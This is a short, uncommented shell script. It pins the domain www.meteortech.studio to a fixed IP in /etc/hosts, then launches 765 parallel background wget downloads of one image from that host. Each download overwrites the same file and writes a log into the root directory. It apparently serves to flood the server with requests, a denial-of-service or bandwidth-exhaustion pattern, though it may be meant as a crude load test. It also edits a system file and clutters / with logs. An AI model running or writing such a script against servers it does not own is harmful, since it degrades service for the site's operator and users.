echo "45.79.99.233 www.meteortech.studio" >> /etc/hosts
for ((i=1; i<=765; i++))  
do  
nohup wget -O sbzp https://www.meteortech.studio/images/newhome.jpg > /x${i}-start.log 2>&1 &
done
echo ok
